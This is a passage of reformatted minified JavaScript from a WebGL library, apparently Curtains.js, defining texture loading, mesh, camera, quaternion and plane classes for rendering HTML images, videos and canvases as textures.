      _onSourceLoaded(t) {
        this.setSource(t),
          "image" === this.sourceType && this.renderer.cache.addTexture(this);
      }
      _bindTexture() {
        this._canDraw &&
          (this.renderer.state.activeTexture !== this.index &&
            (this.gl.activeTexture(this.gl.TEXTURE0 + this.index),
            (this.renderer.state.activeTexture = this.index)),
          this.gl.bindTexture(this.gl.TEXTURE_2D, this._sampler.texture));
      }
      _draw() {
        this._sampler.isActive &&
          (this._bindTexture(this),
          "video" === this.sourceType &&
            this.source &&
            !this._videoFrameCallbackID &&
            this.source.readyState >= this.source.HAVE_CURRENT_DATA &&
            !this.source.paused &&
            (this._willUpdate = !0),
          (this._forceUpdate || (this._willUpdate && this.shouldUpdate)) &&
            ((this._state.generateMipmap = !1), this._upload()),
          "video" === this.sourceType && (this._willUpdate = !1),
          (this._forceUpdate = !1),
          this._parent &&
            this._parent.shareProgram &&
            this._updateMatrixUniform()),
          this.parameters._shouldUpdate &&
            (this._updateTexParameters(), (this.parameters._shouldUpdate = !1));
      }
      onSourceLoaded(t) {
        return t && (this._onSourceLoadedCallback = t), this;
      }
      onSourceUploaded(t) {
        return t && (this._onSourceUploadedCallback = t), this;
      }
      _dispose(t = !1) {
        "video" === this.sourceType ||
        ("image" === this.sourceType && !this.renderer.state.isActive)
          ? (this._loader && this._loader._removeSource(this),
            (this.source = null))
          : "canvas" === this.sourceType &&
            ((this.source.width = this.source.width), (this.source = null)),
          (this._parent = null),
          this.gl &&
            !this._copiedFrom &&
            (t ||
              "image" !== this.sourceType ||
              !this.renderer.state.isActive) &&
            ((this._canDraw = !1),
            this.renderer.cache.removeTexture(this),
            this.gl.activeTexture(this.gl.TEXTURE0 + this.index),
            this.gl.bindTexture(this.gl.TEXTURE_2D, null),
            this.gl.deleteTexture(this._sampler.texture));
      }
    }
    class Z extends class {
      constructor(t, e = "anonymous") {
        (this.type = "TextureLoader"),
          (t = (t && t.renderer) || t) && "Renderer" === t.type
            ? t.gl || P(this.type + ": Renderer WebGL context is undefined", t)
            : P(this.type + ": Renderer not passed as first argument", t),
          (this.renderer = t),
          (this.gl = this.renderer.gl),
          (this.crossOrigin = e),
          (this.elements = []);
      }
      _addElement(t, e, r, i) {
        const n = {
          source: t,
          texture: e,
          load: this._sourceLoaded.bind(this, t, e, r),
          error: this._sourceLoadError.bind(this, t, i),
        };
        return this.elements.push(n), n;
      }
      _sourceLoadError(t, e, r) {
        e && e(t, r);
      }
      _sourceLoaded(t, e, r) {
        e._sourceLoaded ||
          (e._onSourceLoaded(t),
          this._parent &&
            (this._increment && this._increment(),
            this.renderer.nextRender.add(
              () =>
                this._parent._onLoadingCallback &&
                this._parent._onLoadingCallback(e)
            ))),
          r && r(e);
      }
      _getSourceType(t) {
        let e;
        return (
          "string" == typeof t
            ? null !==
              t.match(/\.(jpeg|jpg|jfif|pjpeg|pjp|gif|bmp|png|webp|svg)$/)
              ? (e = "image")
              : null !== t.match(/\.(webm|mp4|ogg|mov)$/) && (e = "video")
            : "IMG" === t.tagName.toUpperCase()
            ? (e = "image")
            : "VIDEO" === t.tagName.toUpperCase()
            ? (e = "video")
            : "CANVAS" === t.tagName.toUpperCase() && (e = "canvas"),
          e
        );
      }
      _createImage(t) {
        const e = new Image();
        return (e.crossOrigin = this.crossOrigin), (e.src = t), e;
      }
      _createVideo(t) {
        const e = document.createElement("video");
        return (e.crossOrigin = this.crossOrigin), (e.src = t), e;
      }
      loadSource(t, e, r, i) {
        switch (this._getSourceType(t)) {
          case "image":
            this.loadImage(t, e, r, i);
            break;
          case "video":
            this.loadVideo(t, e, r, i);
            break;
          case "canvas":
            this.loadCanvas(t, e, r);
            break;
          default:
            this._sourceLoadError(
              t,
              i,
              "this source could not be converted into a texture: " + t
            );
        }
      }
      loadSources(t, e, r, i) {
        for (let n = 0; n < t.length; n++) this.loadSource(t[n], e, r, i);
      }
      loadImage(t, e = {}, r, i) {
        "string" == typeof t && (t = this._createImage(t)),
          (t.crossOrigin = this.crossOrigin),
          this._parent && (e = Object.assign(e, this._parent._texturesOptions));
        const n = this.renderer.cache.getTextureFromSource(t);
        if (n) {
          const i = new Q(this.renderer, {
            loader: this,
            fromTexture: n,
            sampler: e.sampler || t.getAttribute("data-sampler"),
            premultiplyAlpha: e.premultiplyAlpha,
            anisotropy: e.anisotropy,
            generateMipmap: e.generateMipmap,
            wrapS: e.wrapS,
            wrapT: e.wrapT,
            minFilter: e.minFilter,
            magFilter: e.magFilter,
          });
          return (
            r && r(i), void (this._parent && this._addToParent(i, t, "image"))
          );
        }
        const s = new Q(this.renderer, {
            loader: this,
            sampler: e.sampler || t.getAttribute("data-sampler"),
            premultiplyAlpha: e.premultiplyAlpha,
            anisotropy: e.anisotropy,
            generateMipmap: e.generateMipmap,
            wrapS: e.wrapS,
            wrapT: e.wrapT,
            minFilter: e.minFilter,
            magFilter: e.magFilter,
          }),
          o = this._addElement(t, s, r, i);
        t.complete
          ? this._sourceLoaded(t, s, r)
          : t.decode
          ? t
              .decode()
              .then(this._sourceLoaded.bind(this, t, s, r))
              .catch(() => {
                t.addEventListener("load", o.load, !1),
                  t.addEventListener("error", o.error, !1);
              })
          : (t.addEventListener("load", o.load, !1),
            t.addEventListener("error", o.error, !1)),
          this._parent && this._addToParent(s, t, "image");
      }
      loadImages(t, e, r, i) {
        for (let n = 0; n < t.length; n++) this.loadImage(t[n], e, r, i);
      }
      loadVideo(t, e = {}, r, i) {
        "string" == typeof t && (t = this._createVideo(t)),
          (t.preload = !0),
          (t.muted = !0),
          (t.loop = !0),
          (t.playsinline = !0),
          (t.crossOrigin = this.crossOrigin),
          this._parent && (e = Object.assign(e, this._parent._texturesOptions));
        const n = new Q(this.renderer, {
            loader: this,
            sampler: e.sampler || t.getAttribute("data-sampler"),
            premultiplyAlpha: e.premultiplyAlpha,
            anisotropy: e.anisotropy,
            generateMipmap: e.generateMipmap,
            wrapS: e.wrapS,
            wrapT: e.wrapT,
            minFilter: e.minFilter,
            magFilter: e.magFilter,
          }),
          s = this._addElement(t, n, r, i);
        t.addEventListener("canplaythrough", s.load, !1),
          t.addEventListener("error", s.error, !1),
          t.readyState >= t.HAVE_FUTURE_DATA &&
            r &&
            this._sourceLoaded(t, n, r),
          t.load(),
          this._addToParent && this._addToParent(n, t, "video"),
          "requestVideoFrameCallback" in HTMLVideoElement.prototype &&
            ((s.videoFrameCallback = n._videoFrameCallback.bind(n)),
            (n._videoFrameCallbackID = t.requestVideoFrameCallback(
              s.videoFrameCallback
            )));
      }
      loadVideos(t, e, r, i) {
        for (let n = 0; n < t.length; n++) this.loadVideo(t[n], e, r, i);
      }
      loadCanvas(t, e = {}, r) {
        this._parent && (e = Object.assign(e, this._parent._texturesOptions));
        const i = new Q(this.renderer, {
          loader: this,
          sampler: e.sampler || t.getAttribute("data-sampler"),
          premultiplyAlpha: e.premultiplyAlpha,
          anisotropy: e.anisotropy,
          generateMipmap: e.generateMipmap,
          wrapS: e.wrapS,
          wrapT: e.wrapT,
          minFilter: e.minFilter,
          magFilter: e.magFilter,
        });
        this._addElement(t, i, r, null),
          this._sourceLoaded(t, i, r),
          this._parent && this._addToParent(i, t, "canvas");
      }
      loadCanvases(t, e, r) {
        for (let i = 0; i < t.length; i++) this.loadCanvas(t[i], e, r);
      }
      _removeSource(t) {
        const e = this.elements.find((e) => e.texture.uuid === t.uuid);
        e &&
          ("image" === t.sourceType
            ? e.source.removeEventListener("load", e.load, !1)
            : "video" === t.sourceType &&
              (e.videoFrameCallback &&
                t._videoFrameCallbackID &&
                e.source.cancelVideoFrameCallback(t._videoFrameCallbackID),
              e.source.removeEventListener("canplaythrough", e.load, !1),
              e.source.pause(),
              e.source.removeAttribute("src"),
              e.source.load()),
          e.source.removeEventListener("error", e.error, !1));
      }
    } {
      constructor(
        t,
        e,
        {
          sourcesLoaded: r = 0,
          sourcesToLoad: i = 0,
          complete: n = !1,
          onComplete: s = () => {},
        } = {}
      ) {
        super(t, e.crossOrigin),
          (this.type = "PlaneTextureLoader"),
          (this._parent = e),
          "Plane" !== this._parent.type &&
            "PingPongPlane" !== this._parent.type &&
            "ShaderPass" !== this._parent.type &&
            (C(this.type + ": Wrong parent type assigned to this loader"),
            (this._parent = null)),
          (this.sourcesLoaded = r),
          (this.sourcesToLoad = i),
          (this.complete = n),
          (this.onComplete = s);
      }
      _setLoaderSize(t) {
        (this.sourcesToLoad = t),
          0 === this.sourcesToLoad &&
            ((this.complete = !0),
            this.renderer.nextRender.add(
              () => this.onComplete && this.onComplete()
            ));
      }
      _increment() {
        this.sourcesLoaded++,
          this.sourcesLoaded >= this.sourcesToLoad &&
            !this.complete &&
            ((this.complete = !0),
            this.renderer.nextRender.add(
              () => this.onComplete && this.onComplete()
            ));
      }
      _addSourceToParent(t, e) {
        if ("image" === e) {
          const e = this._parent.images;
          !e.find((e) => e.src === t.src) && e.push(t);
        } else if ("video" === e) {
          const e = this._parent.videos;
          !e.find((e) => e.src === t.src) && e.push(t);
        } else if ("canvas" === e) {
          const e = this._parent.canvases;
          !e.find((e) => e.isSameNode(t)) && e.push(t);
        }
      }
      _addToParent(t, e, r) {
        this._addSourceToParent(e, r),
          this._parent && t.addParent(this._parent);
      }
    }
    class $ extends class {
      constructor(
        t,
        e = "Mesh",
        {
          shareProgram: r = !1,
          vertexShaderID: i,
          fragmentShaderID: n,
          vertexShader: s,
          fragmentShader: o,
          uniforms: a = {},
          widthSegments: l = 1,
          heightSegments: h = 1,
          renderOrder: u,
          depthTest: c = !0,
          cullFace: d = "back",
          texturesOptions: p = {},
          crossOrigin: f = "anonymous",
        } = {}
      ) {
        (this.type = e),
          ((t = (t && t.renderer) || t) && "Renderer" === t.type) ||
            (P(
              this.type +
                ": Curtains not passed as first argument or Curtains Renderer is missing",
              t
            ),
            setTimeout(() => {
              this._onErrorCallback && this._onErrorCallback();
            }, 0)),
          (this.renderer = t),
          (this.gl = this.renderer.gl),
          this.gl ||
            (this.renderer.production ||
              P(
                this.type +
                  ": Unable to create a " +
                  this.type +
                  " because the Renderer WebGl context is not defined"
              ),
            setTimeout(() => {
              this._onErrorCallback && this._onErrorCallback();
            }, 0)),
          (this._canDraw = !1),
          (this.renderOrder = u),
          (this.shareProgram = r),
          (this._depthTest = c),
          (this.cullFace = d),
          "back" !== this.cullFace &&
            "front" !== this.cullFace &&
            "none" !== this.cullFace &&
            (this.cullFace = "back"),
          (this.textures = []),
          (p = Object.assign(
            {
              premultiplyAlpha: !1,
              anisotropy: 1,
              floatingPoint: "none",
              wrapS: this.gl.CLAMP_TO_EDGE,
              wrapT: this.gl.CLAMP_TO_EDGE,
              minFilter: this.gl.LINEAR,
              magFilter: this.gl.LINEAR,
            },
            p
          )),
          (this._texturesOptions = p),
          (this.crossOrigin = f),
          !s &&
            i &&
            document.getElementById(i) &&
            (s = document.getElementById(i).innerHTML),
          !o &&
            n &&
            document.getElementById(n) &&
            (o = document.getElementById(n).innerHTML),
          this._initMesh(),
          (l = parseInt(l)),
          (h = parseInt(h)),
          (this._geometry = new X(this.renderer, { width: l, height: h })),
          (this._program = new q(this.renderer, {
            parent: this,
            vertexShader: s,
            fragmentShader: o,
          })),
          this._program.compiled
            ? (this._program.createUniforms(a),
              (this.uniforms = this._program.uniformsManager.uniforms),
              this._geometry.setProgram(this._program),
              this.renderer.onSceneChange())
            : this.renderer.nextRender.add(
                () => this._onErrorCallback && this._onErrorCallback()
              );
      }
      _initMesh() {
        (this.uuid = F()),
          (this.loader = new Z(this.renderer, this, {
            sourcesLoaded: 0,
            initSourcesToLoad: 0,
            complete: !1,
            onComplete: () => {
              this._onReadyCallback && this._onReadyCallback(),
                this.renderer.needRender();
            },
          })),
          (this.images = []),
          (this.videos = []),
          (this.canvases = []),
          (this.userData = {}),
          (this._canDraw = !0);
      }
      _restoreContext() {
        (this._canDraw = !1),
          this._matrices && (this._matrices = null),
          (this._program = new q(this.renderer, {
            parent: this,
            vertexShader: this._program.vsCode,
            fragmentShader: this._program.fsCode,
          })),
          this._program.compiled &&
            (this._geometry.restoreContext(this._program),
            this._program.createUniforms(this.uniforms),
            (this.uniforms = this._program.uniformsManager.uniforms),
            this._programRestored());
      }
      setRenderTarget(t) {
        t && "RenderTarget" === t.type
          ? ("Plane" === this.type && this.renderer.scene.removePlane(this),
            (this.target = t),
            "Plane" === this.type && this.renderer.scene.addPlane(this))
          : this.renderer.production ||
            C(
              this.type +
                ": Could not set the render target because the argument passed is not a RenderTarget class object",
              t
            );
      }
      setRenderOrder(t = 0) {
        (t = isNaN(t) ? this.renderOrder : parseInt(t)) !== this.renderOrder &&
          ((this.renderOrder = t),
          this.renderer.scene.setPlaneRenderOrder(this));
      }
      createTexture(t = {}) {
        const e = new Q(this.renderer, Object.assign(this._texturesOptions, t));
        return e.addParent(this), e;
      }
      addTexture(t) {
        t && "Texture" === t.type
          ? t.addParent(this)
          : this.renderer.production ||
            C(
              this.type + ": cannot add ",
              t,
              " to this " + this.type + " because it is not a valid texture"
            );
      }
      loadSources(t, e = {}, r, i) {
        for (let n = 0; n < t.length; n++) this.loadSource(t[n], e, r, i);
      }
      loadSource(t, e = {}, r, i) {
        this.loader.loadSource(
          t,
          Object.assign(this._texturesOptions, e),
          (t) => {
            r && r(t);
          },
          (t, e) => {
            this.renderer.production ||
              C(
                this.type +
                  ": this HTML tag could not be converted into a texture:",
                t.tagName
              ),
              i && i(t, e);
          }
        );
      }
      loadImage(t, e = {}, r, i) {
        this.loader.loadImage(
          t,
          Object.assign(this._texturesOptions, e),
          (t) => {
            r && r(t);
          },
          (t, e) => {
            this.renderer.production ||
              C(
                this.type + ": There has been an error:\n",
                e,
                "\nwhile loading this image:\n",
                t
              ),
              i && i(t, e);
          }
        );
      }
      loadVideo(t, e = {}, r, i) {
        this.loader.loadVideo(
          t,
          Object.assign(this._texturesOptions, e),
          (t) => {
            r && r(t);
          },
          (t, e) => {
            this.renderer.production ||
              C(
                this.type + ": There has been an error:\n",
                e,
                "\nwhile loading this video:\n",
                t
              ),
              i && i(t, e);
          }
        );
      }
      loadCanvas(t, e = {}, r) {
        this.loader.loadCanvas(
          t,
          Object.assign(this._texturesOptions, e),
          (t) => {
            r && r(t);
          }
        );
      }
      loadImages(t, e = {}, r, i) {
        for (let n = 0; n < t.length; n++) this.loadImage(t[n], e, r, i);
      }
      loadVideos(t, e = {}, r, i) {
        for (let n = 0; n < t.length; n++) this.loadVideo(t[n], e, r, i);
      }
      loadCanvases(t, e = {}, r) {
        for (let i = 0; i < t.length; i++) this.loadCanvas(t[i], e, r);
      }
      playVideos() {
        for (let t = 0; t < this.textures.length; t++) {
          const e = this.textures[t];
          if ("video" === e.sourceType) {
            const t = e.source.play();
            void 0 !== t &&
              t.catch((t) => {
                this.renderer.production ||
                  C(this.type + ": Could not play the video : ", t);
              });
          }
        }
      }
      _draw() {
        this.renderer.setDepth(this._depthTest),
          this.renderer.setFaceCulling(this.cullFace),
          this._program.updateUniforms(),
          this._geometry.bindBuffers(),
          (this.renderer.state.forceBufferUpdate = !1);
        for (let t = 0; t < this.textures.length; t++) this.textures[t]._draw();
        this._geometry.draw(),
          (this.renderer.state.activeTexture = null),
          this._onAfterRenderCallback && this._onAfterRenderCallback();
      }
      onError(t) {
        return t && (this._onErrorCallback = t), this;
      }
      onLoading(t) {
        return t && (this._onLoadingCallback = t), this;
      }
      onReady(t) {
        return t && (this._onReadyCallback = t), this;
      }
      onRender(t) {
        return t && (this._onRenderCallback = t), this;
      }
      onAfterRender(t) {
        return t && (this._onAfterRenderCallback = t), this;
      }
      remove() {
        (this._canDraw = !1),
          this.target && this.renderer.bindFrameBuffer(null),
          this._dispose(),
          "Plane" === this.type
            ? this.renderer.removePlane(this)
            : "ShaderPass" === this.type &&
              (this.target &&
                ((this.target._shaderPass = null),
                this.target.remove(),
                (this.target = null)),
              this.renderer.removeShaderPass(this));
      }
      _dispose() {
        if (this.gl) {
          this._geometry && this._geometry.dispose(),
            this.target &&
              "ShaderPass" === this.type &&
              (this.renderer.removeRenderTarget(this.target),
              this.textures.shift());
          for (let t = 0; t < this.textures.length; t++)
            this.textures[t]._dispose();
          this.textures = null;
        }
      }
    } {
      constructor(
        t,
        e,
        r = "DOMMesh",
        {
          shareProgram: i,
          widthSegments: n,
          heightSegments: s,
          renderOrder: o,
          depthTest: a,
          cullFace: l,
          uniforms: h,
          vertexShaderID: u,
          fragmentShaderID: c,
          vertexShader: d,
          fragmentShader: p,
          texturesOptions: f,
          crossOrigin: g,
        } = {}
      ) {
        super(t, r, {
          shareProgram: i,
          widthSegments: n,
          heightSegments: s,
          renderOrder: o,
          depthTest: a,
          cullFace: l,
          uniforms: h,
          vertexShaderID: (u = u || (e && e.getAttribute("data-vs-id"))),
          fragmentShaderID: (c = c || (e && e.getAttribute("data-fs-id"))),
          vertexShader: d,
          fragmentShader: p,
          texturesOptions: f,
          crossOrigin: g,
        }),
          (this.htmlElement = e),
          (this.htmlElement && 0 !== this.htmlElement.length) ||
            this.renderer.production ||
            C(
              this.type +
                ": The HTML element you specified does not currently exists in the DOM"
            ),
          this._setDocumentSizes();
      }
      _setDocumentSizes() {
        let t = this.htmlElement.getBoundingClientRect();
        this._boundingRect || (this._boundingRect = {}),
          (this._boundingRect.document = {
            width: t.width * this.renderer.pixelRatio,
            height: t.height * this.renderer.pixelRatio,
            top: t.top * this.renderer.pixelRatio,
            left: t.left * this.renderer.pixelRatio,
          });
      }
      getBoundingRect() {
        return {
          width: this._boundingRect.document.width,
          height: this._boundingRect.document.height,
          top: this._boundingRect.document.top,
          left: this._boundingRect.document.left,
          right:
            this._boundingRect.document.left +
            this._boundingRect.document.width,
          bottom:
            this._boundingRect.document.top +
            this._boundingRect.document.height,
        };
      }
      resize() {
        this._setDocumentSizes(),
          "Plane" === this.type &&
            (this.setPerspective(
              this.camera.fov,
              this.camera.near,
              this.camera.far
            ),
            this._applyWorldPositions());
        for (let t = 0; t < this.textures.length; t++)
          this.textures[t].resize();
        this.renderer.nextRender.add(
          () => this._onAfterResizeCallback && this._onAfterResizeCallback()
        );
      }
      mouseToPlaneCoords(t) {
        const e = this.scale ? this.scale : new G(1, 1),
          r = new G(
            (this._boundingRect.document.width -
              this._boundingRect.document.width * e.x) /
              2,
            (this._boundingRect.document.height -
              this._boundingRect.document.height * e.y) /
              2
          ),
          i =
            (this._boundingRect.document.width * e.x) /
            this.renderer.pixelRatio,
          n =
            (this._boundingRect.document.height * e.y) /
            this.renderer.pixelRatio,
          s =
            (this._boundingRect.document.top + r.y) / this.renderer.pixelRatio,
          o =
            (this._boundingRect.document.left + r.x) / this.renderer.pixelRatio;
        return new G(((t.x - o) / i) * 2 - 1, 1 - ((t.y - s) / n) * 2);
      }
      onAfterResize(t) {
        return t && (this._onAfterResizeCallback = t), this;
      }
    }
    class J {
      constructor({
        fov: t = 50,
        near: e = 0.1,
        far: r = 150,
        width: i,
        height: n,
        pixelRatio: s = 1,
      } = {}) {
        (this.position = new K()),
          (this.projectionMatrix = new Y()),
          (this.worldMatrix = new Y()),
          (this.viewMatrix = new Y()),
          (this._shouldUpdate = !1),
          this.setSize(),
          this.setPerspective(t, e, r, i, n, s);
      }
      setFov(t) {
        (t = isNaN(t) ? this.fov : parseFloat(t)),
          (t = Math.max(1, Math.min(t, 179))) !== this.fov &&
            ((this.fov = t),
            this.setPosition(),
            this.setCSSPerspective(),
            (this._shouldUpdate = !0));
      }
      setNear(t) {
        (t = isNaN(t) ? this.near : parseFloat(t)),
          (t = Math.max(t, 0.01)) !== this.near &&
            ((this.near = t), (this._shouldUpdate = !0));
      }
      setFar(t) {
        (t = isNaN(t) ? this.far : parseFloat(t)),
          (t = Math.max(t, 50)) !== this.far &&
            ((this.far = t), (this._shouldUpdate = !0));
      }
      setPixelRatio(t) {
        t !== this.pixelRatio && (this._shouldUpdate = !0),
          (this.pixelRatio = t);
      }
      setSize(t, e) {
        (t === this.width && e === this.height) || (this._shouldUpdate = !0),
          (this.width = t),
          (this.height = e);
      }
      setPerspective(t, e, r, i, n, s) {
        this.setPixelRatio(s),
          this.setSize(i, n),
          this.setFov(t),
          this.setNear(e),
          this.setFar(r),
          this._shouldUpdate && this.updateProjectionMatrix();
      }
      setPosition() {
        this.position.set(0, 0, 2 * Math.tan((Math.PI / 180) * 0.5 * this.fov)),
          this.worldMatrix.setFromArray([
            1,
            0,
            0,
            0,
            0,
            1,
            0,
            0,
            0,
            0,
            1,
            0,
            this.position.x,
            this.position.y,
            this.position.z,
            1,
          ]),
          (this.viewMatrix = this.viewMatrix
            .copy(this.worldMatrix)
            .getInverse());
      }
      setCSSPerspective() {
        this.CSSPerspective =
          Math.pow(
            Math.pow(this.width / (2 * this.pixelRatio), 2) +
              Math.pow(this.height / (2 * this.pixelRatio), 2),
            0.5
          ) /
          (0.5 * this.position.z);
      }
      updateProjectionMatrix() {
        const t = this.width / this.height,
          e = this.near * Math.tan((Math.PI / 180) * 0.5 * this.fov),
          r = 2 * e,
          i = t * r,
          n = -0.5 * i,
          s = n + i,
          o = e - r,
          a = (2 * this.near) / (s - n),
          l = (2 * this.near) / (e - o),
          h = (s + n) / (s - n),
          u = (e + o) / (e - o),
          c = -(this.far + this.near) / (this.far - this.near),
          d = (-2 * this.far * this.near) / (this.far - this.near);
        this.projectionMatrix.setFromArray([
          a,
          0,
          0,
          0,
          0,
          l,
          0,
          0,
          h,
          u,
          c,
          -1,
          0,
          0,
          d,
          0,
        ]);
      }
      forceUpdate() {
        this._shouldUpdate = !0;
      }
      cancelUpdate() {
        this._shouldUpdate = !1;
      }
    }
    class tt {
      constructor(t = new Float32Array([0, 0, 0, 1]), e = "XYZ") {
        (this.type = "Quat"), (this.elements = t), (this.axisOrder = e);
      }
      setFromArray(t) {
        return (
          (this.elements[0] = t[0]),
          (this.elements[1] = t[1]),
          (this.elements[2] = t[2]),
          (this.elements[3] = t[3]),
          this
        );
      }
      setAxisOrder(t) {
        switch ((t = t.toUpperCase())) {
          case "XYZ":
          case "YXZ":
          case "ZXY":
          case "ZYX":
          case "YZX":
          case "XZY":
            this.axisOrder = t;
            break;
          default:
            this.axisOrder = "XYZ";
        }
        return this;
      }
      copy(t) {
        return (
          (this.elements = t.elements), (this.axisOrder = t.axisOrder), this
        );
      }
      clone() {
        return new tt().copy(this);
      }
      equals(t) {
        return (
          this.elements[0] === t.elements[0] &&
          this.elements[1] === t.elements[1] &&
          this.elements[2] === t.elements[2] &&
          this.elements[3] === t.elements[3] &&
          this.axisOrder === t.axisOrder
        );
      }
      setFromVec3(t) {
        const e = 0.5 * t.x,
          r = 0.5 * t.y,
          i = 0.5 * t.z,
          n = Math.cos(e),
          s = Math.cos(r),
          o = Math.cos(i),
          a = Math.sin(e),
          l = Math.sin(r),
          h = Math.sin(i);
        return (
          "XYZ" === this.axisOrder
            ? ((this.elements[0] = a * s * o + n * l * h),
              (this.elements[1] = n * l * o - a * s * h),
              (this.elements[2] = n * s * h + a * l * o),
              (this.elements[3] = n * s * o - a * l * h))
            : "YXZ" === this.axisOrder
            ? ((this.elements[0] = a * s * o + n * l * h),
              (this.elements[1] = n * l * o - a * s * h),
              (this.elements[2] = n * s * h - a * l * o),
              (this.elements[3] = n * s * o + a * l * h))
            : "ZXY" === this.axisOrder
            ? ((this.elements[0] = a * s * o - n * l * h),
              (this.elements[1] = n * l * o + a * s * h),
              (this.elements[2] = n * s * h + a * l * o),
              (this.elements[3] = n * s * o - a * l * h))
            : "ZYX" === this.axisOrder
            ? ((this.elements[0] = a * s * o - n * l * h),
              (this.elements[1] = n * l * o + a * s * h),
              (this.elements[2] = n * s * h - a * l * o),
              (this.elements[3] = n * s * o + a * l * h))
            : "YZX" === this.axisOrder
            ? ((this.elements[0] = a * s * o + n * l * h),
              (this.elements[1] = n * l * o + a * s * h),
              (this.elements[2] = n * s * h - a * l * o),
              (this.elements[3] = n * s * o - a * l * h))
            : "XZY" === this.axisOrder &&
              ((this.elements[0] = a * s * o - n * l * h),
              (this.elements[1] = n * l * o - a * s * h),
              (this.elements[2] = n * s * h + a * l * o),
              (this.elements[3] = n * s * o + a * l * h)),
          this
        );
      }
    }
    class et extends $ {
      constructor(
        t,
        e,
        {
          shareProgram: r,
          widthSegments: i,
          heightSegments: n,
          renderOrder: s = 0,
          depthTest: o,
          cullFace: a,
          uniforms: l,
          vertexShaderID: h,
          fragmentShaderID: u,
          vertexShader: c,
          fragmentShader: d,
          texturesOptions: p,
          crossOrigin: f,
          alwaysDraw: g = !1,
          visible: m = !0,
          transparent: _ = !1,
          drawCheckMargins: v = { top: 0, right: 0, bottom: 0, left: 0 },
          autoloadSources: y = !0,
          watchScroll: D = !0,
          fov: x = 50,
        } = {}
      ) {
        super(t, e, "Plane", {
          shareProgram: r,
          widthSegments: i,
          heightSegments: n,
          renderOrder: s,
          depthTest: o,
          cullFace: a,
          uniforms: l,
          vertexShaderID: h,
          fragmentShaderID: u,
          vertexShader: c,
          fragmentShader: d,
          texturesOptions: p,
          crossOrigin: f,
        }),
          (this.index = this.renderer.planes.length),
          (this.target = null),
          (this.alwaysDraw = g),
          (this._shouldDraw = !0),
          (this.visible = m),
          (this._transparent = _),
          (this.drawCheckMargins = v),
          (this.autoloadSources = y),
          (this.watchScroll = D),
          (this._updateMVMatrix = !1),
          (this.camera = new J({
            fov: x,
            width: this.renderer._boundingRect.width,
            height: this.renderer._boundingRect.height,
            pixelRatio: this.renderer.pixelRatio,
          })),
          this._program.compiled &&
            (this._initPlane(),
            this.renderer.scene.addPlane(this),
            this.renderer.planes.push(this));
      }
      _programRestored() {
        this.target &&
          this.setRenderTarget(this.renderer.renderTargets[this.target.index]),
          this._initMatrices(),
          this.setPerspective(
            this.camera.fov,
            this.camera.near,
            this.camera.far
          ),
          this._applyWorldPositions(),
          this.renderer.scene.addPlane(this);
        for (let t = 0; t < this.textures.length; t++)
          (this.textures[t]._parent = this), this.textures[t]._restoreContext();
        this._canDraw = !0;
      }
      _initPlane() {
        this._initTransformValues(),
          this._initPositions(),
          this.setPerspective(
            this.camera.fov,
            this.camera.near,
            this.camera.far
          ),
          this._initSources();
      }
      _initTransformValues() {
        (this.rotation = new K()),
          (this.quaternion = new tt()),
          (this.relativeTranslation = new K()),
          (this._translation = new K()),
          (this.scale = new K(1, 1, 1)),
          (this.transformOrigin = new K(0.5, 0.5, 0));
      }
      resetPlane(t) {
        this._initTransformValues(),
          null !== t && t
            ? ((this.htmlElement = t), this.updatePosition())
            : t ||
              this.renderer.production ||
              C(
                this.type +
                  ": You are trying to reset a plane with a HTML element that does not exist. The old HTML element will be kept instead."
              );
      }
      removeRenderTarget() {
        this.target &&
          (this.renderer.scene.removePlane(this),
          (this.target = null),
          this.renderer.scene.addPlane(this));
      }
      _initPositions() {
        this._initMatrices(), this._applyWorldPositions();
      }
      _initMatrices() {
        this._matrices = {
          mvMatrix: {
            name: "uMVMatrix",
            matrix: new Y(),
            location: this.gl.getUniformLocation(
              this._program.program,
              "uMVMatrix"
            ),
          },
          pMatrix: {
            name: "uPMatrix",
            matrix: new Y(),
            location: this.gl.getUniformLocation(
              this._program.program,
              "uPMatrix"
            ),
          },
        };
      }
      _setWorldSizes() {
        const t =
            this._boundingRect.document.width / 2 +
            this._boundingRect.document.left,
          e =
            this._boundingRect.document.height / 2 +
            this._boundingRect.document.top,
          r =
            this.renderer._boundingRect.width / 2 +
            this.renderer._boundingRect.left,
          i =
            this.renderer._boundingRect.height / 2 +
            this.renderer._boundingRect.top;
        (this._boundingRect.world = {
          width:
            this._boundingRect.document.width /
            this.renderer._boundingRect.width,
          height:
            this._boundingRect.document.height /
            this.renderer._boundingRect.height,
          top: (i - e) / this.renderer._boundingRect.height,
          left: (t - r) / this.renderer._boundingRect.height,
        }),
          (this._boundingRect.world.scale = {
            x:
              ((this.renderer._boundingRect.width /
                this.renderer._boundingRect.height) *
                this._boundingRect.world.width) /
              2,
            y: this._boundingRect.world.height / 2,
          });
      }
      _setPerspectiveMatrix() {
        (this.shareProgram ||
          (!this.shareProgram && this.camera._shouldUpdate)) &&
          (this.renderer.useProgram(this._program),
          this.gl.uniformMatrix4fv(
            this._matrices.pMatrix.location,
            !1,
            this._matrices.pMatrix.matrix.elements
          )),
          this.camera.cancelUpdate();
      }
      setPerspective(t, e, r) {
        this.camera.setPerspective(
          t,
          e,
          r,
          this.renderer._boundingRect.width,
          this.renderer._boundingRect.height,
          this.renderer.pixelRatio
        ),
          this.renderer.state.isContextLost && this.camera.forceUpdate(),
          (this._matrices.pMatrix.matrix = this.camera.projectionMatrix),
          (this._updateMVMatrix = this.camera._shouldUpdate);
      }
      _setMVMatrix() {
        if (this._updateMVMatrix) {
          this._translation.z =
            -(1 - this.relativeTranslation.z / this.camera.CSSPerspective) /
            this.camera.position.z;
          const t = new K(
            (2 * this.transformOrigin.x - 1) * this._boundingRect.world.scale.x,
            -(2 * this.transformOrigin.y - 1) *
              this._boundingRect.world.scale.y,
            this.transformOrigin.z
          );
          let e = new Y().composeFromOrigin(
            this._translation,
            this.quaternion,
            this.scale,
            t
          );
          const r = new Y([
            this._boundingRect.world.scale.x,
            0,
            0,
            0,
            0,
            this._boundingRect.world.scale.y,
            0,
            0,
            0,
            0,
            1,
            0,
            0,
            0,
            0,
            1,
          ]);
          (this._matrices.mvMatrix.matrix = e.multiply(r)),
            (this._matrices.mVPMatrix = this._matrices.pMatrix.matrix.multiply(
              this._matrices.mvMatrix.matrix
            )),
            this.alwaysDraw || this._shouldDrawCheck();
        }
        (this.shareProgram || (!this.shareProgram && this._updateMVMatrix)) &&
          (this.renderer.useProgram(this._program),
          this.gl.uniformMatrix4fv(
            this._matrices.mvMatrix.location,
            !1,
            this._matrices.mvMatrix.matrix.elements
          )),
          (this._updateMVMatrix = !1);
      }
